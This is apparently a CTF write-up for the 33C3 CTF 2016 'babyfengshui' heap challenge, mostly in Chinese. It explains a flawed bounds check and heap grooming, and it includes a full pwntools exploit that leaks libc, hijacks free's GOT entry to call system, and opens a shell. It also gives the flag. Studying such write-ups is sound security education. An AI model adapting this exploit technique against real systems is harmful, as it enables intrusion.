---
title: '[33C3 CTF 2016] babyfengshui 150'
author: bruce30262
tags:
  - pwn
  - heap
  - heap overflow
  - GOT hijacking
  - 33C3 CTF 2016
categories:
  - write-ups
date: 2016-12-31 09:36:00
---
## Info  
> Category: pwn
> Point: 150
> Author: bruce30262 @ BambooFox

## Analyzing
32 bit ELF, Partial RELRO, canary & NX enabled, 沒 PIE

程式選單 :
```
$ ./babyfengshui
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
```
Add a user:
```
Action: 0
size of description: 50 <-- max length of description
name: AAAA 
text length: 12 <-- actual length of description
text: 1234
```
Show a user:
```
Action: 2
index: 0 <-- user's index
name: AAAA
description: 1234
```
Update a user:
```
Action: 3
index: 0
text length: 10 <-- new length of the description
text: 1234567890
```
`user` 的 data structure
```c 
struct user{
    char* desc;
    char name[124];
};
```
程式在 delete user 的時候除了會 free 掉 `user->desc` 和 `user` 本身之外，還會將 `user` pointer 清成 0，因此這題並不存在 Use-After-Free 的漏洞。

程式在設置 `user->desc` 的時候有一個很奇怪的 protection:
```c
// users = struct user *users[]
 if ( &users[id]->desc[text_len] >= &users[id] - 4 )
 {
   puts("my l33t defenses cannot be fooled, cya!");
   exit(1);
 }
 printf("text: ");
 read_n(users[id]->desc, text_len + 1);
```
這段程式碼的意思是，`user->desc` 這個 pointer + `text_len` 必須小於 `user` 這個 pointer。感覺程式是想用這段程式碼來防止 `user` 被 `user->desc` 覆寫 ( 避免 heap overflow )。

可是這段保護真的有用嗎 ?

## Exploit

如果我們有辦法排出下圖的 heap memory layout:
```
            +-----------------------+
userD->desc |                       |
            |                       |
            +-----------------------+
            |            userB->desc| userB
            |                       |
            |                       |
            |                       |
            +-----------------------+
            |            userC->desc| userC
            |                       |
            |                       |
            |                       |
            +-----------------------+
            |            userD->desc| userD
            |                       |
            |                       |
            |                       |
            +-----------------------+
```

根據那段保護的程式碼，`userD->desc + text_len` 必須小於 `userD`。我們可以看到 `userD->desc` 離 `userD` 有一段距離，中間還包含了 `userB` 和 `userC` 這兩個 data structure，說明我們其實可以覆寫掉整個 `userB` 和 `userC`。

這裡只要對 malloc.c 的 memory allocation 機制熟悉的話，要排出上圖的 heap memory layout 並不難。之後只要透過上述的 heap overflow 方式，我們就可以改掉 `userB->desc` 這個 data pointer，進而做到任意讀寫，剩下的就是做 GOT hijacking 拿 shell。

```python exp_baby.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "78.46.224.83"
PORT = 1456
ELF_PATH = "./babyfengshui_noalarm"
LIBC_PATH = "./libc-2.19.so"

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def add_user(desc_len, name, text_len, text):
    r.sendlineafter("Action: ", "0")
    r.sendlineafter("description: ", str(desc_len))
    r.sendlineafter("name: ", name)
    r.sendlineafter("length: ", str(text_len))
    r.sendlineafter("text: ", text)

def del_user(index):
    r.sendlineafter("Action: ", "1")
    r.sendlineafter("index: ", str(index))

def show_user(index):
    r.sendlineafter("Action: ", "2")
    r.sendlineafter("index: ", str(index))

def update_user(index, text_len, text):
    r.sendlineafter("Action: ", "3")
    r.sendlineafter("index: ", str(index))
    r.sendlineafter("length: ", str(text_len))
    r.sendlineafter("text: ", text)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    add_user(50, "A"*123, 12, "a"*12)
    add_user(50, "B"*123, 12, "b"*12) 
    add_user(50, "C"*123, 12, "sh\x00") # user[2], desc = "sh\x00" (for later's GOT hijacking)
    del_user(0)
    add_user(90, "D"*123, 12, "d"*12)
    add_user(50, "E"*123, 0x100, "i"*0xf8 + p32(elf.got['__libc_start_main'])) 
    # now user[4]'s desc is user[0]'s desc (in previous)
    # user[4]->desc + 0x2c8 = user[4], which means we can overflow user[4]->desc & overwrite user[1]->desc to libc_start_main@got.plt

    # leak address
    show_user(1)
    r.recvuntil("description: ")
    libc.address += u32(r.recv(4)) - libc.symbols['__libc_start_main']
    system_addr = libc.symbols['system']
    log.success("libc: "+hex(libc.address))
    log.success("system: "+hex(system_addr))
    
    # change user[1]->desc into free@got.plt
    # hijack free's got, then free user[2] to get shell
    update_user(4, 0x100, "i"*0xf8 + p32(elf.got['free']))
    update_user(1, 5, p32(system_addr))
    del_user(2)

    r.interactive()
```

flag: `33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1`

